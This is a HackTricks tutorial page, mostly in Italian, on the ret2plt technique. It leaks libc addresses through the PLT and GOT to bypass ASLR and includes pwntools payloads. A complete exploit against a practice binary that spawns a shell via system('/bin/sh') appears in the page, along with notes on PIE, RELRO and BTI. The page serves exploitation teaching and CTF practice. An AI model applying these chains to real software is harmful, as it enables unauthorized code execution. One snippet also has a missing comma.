# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

Lo scopo di questa tecnica è **effettuare un leak di un indirizzo di una funzione dalla PLT** per poter bypassare ASLR. Questo perché, per esempio, se effettui il leak dell'indirizzo della funzione `puts` dalla libc, puoi poi **calcolare dove si trova la base di `libc`** e calcolare gli offset per accedere ad altre funzioni come **`system`**.

Questo può essere fatto con un payload `pwntools` come ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Nota come **`puts`** (usando l'indirizzo dal PLT) viene chiamato con l'indirizzo di `puts` presente nel GOT (Global Offset Table). Questo perché nel momento in cui `puts` stampa la voce del GOT di puts, questa **voce conterrà l'esatto indirizzo di `puts` in memoria**.

Nota anche come l'indirizzo di `main` sia usato nell'exploit in modo che, quando `puts` termina la sua esecuzione, il **binary richiami `main` invece di terminare** (quindi il leak rimarrà valido).

> [!CAUTION]
> Nota che perché questo funzioni il **binary non può essere compilato con PIE** oppure devi aver **trovato un leak per bypassare PIE** per poter conoscere l'indirizzo del PLT, GOT e main. Altrimenti, devi prima bypassare PIE.

Puoi trovare un [**esempio completo di questo bypass qui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Questo era l'exploit finale da quell'**esempio**:

<details>
<summary>Esempio completo di exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Considerazioni moderne

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT è di sola lettura ma ret2plt funziona ancora per i leak perché leggi solo la slot del GOT. Se il simbolo non è mai stato chiamato, il tuo primo ret2plt eseguirà anche la lazy binding e poi stamperà la slot risolta.
- **ASLR + PIE**: se PIE è abilitato, prima effettua un leak di un code pointer (es. saved return address, function pointer, o una entry `.plt` tramite un altro format‑string/infoleak) per calcolare la base PIE, poi costruisci la catena ret2plt con gli indirizzi PLT/GOT ribasati.
- **Architetture non x86 con BTI/PAC (AArch64)**: le entry PLT sono validi BTI landing pad (`bti c`), quindi quando sfrutti binari abilitati BTI preferisci saltare nello stub PLT (o in un altro gadget annotato BTI) invece di saltare direttamente in un gadget libc senza BTI, altrimenti la CPU genererà errori `BRK`/`PAC`.
- **Quick resolution helper**: se la funzione target non è ancora risolta e ti serve un leak in un solo colpo, concatena la chiamata PLT due volte: prima `elf.plt['foo']` (per risolvere) e poi di nuovo `elf.plt['foo']` con l'indirizzo GOT come argomento per stampare la slot ora riempita.

## Altri esempi & Riferimenti

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled ma senza PIE: il primo passo è riempire un overflow fino al byte 0x00 del canary per poi chiamare puts ed effettuare il leak. Con il canary si crea un ROP gadget per chiamare puts e ottenere il leak dell'indirizzo di puts dal GOT e poi un ROP gadget per chiamare `system('/bin/sh')`.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main da una funzione figlia. ROP gadget per chiamare puts e ottenere il leak dell'indirizzo di puts dal GOT e poi chiamare un one gadget.

## Riferimenti

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
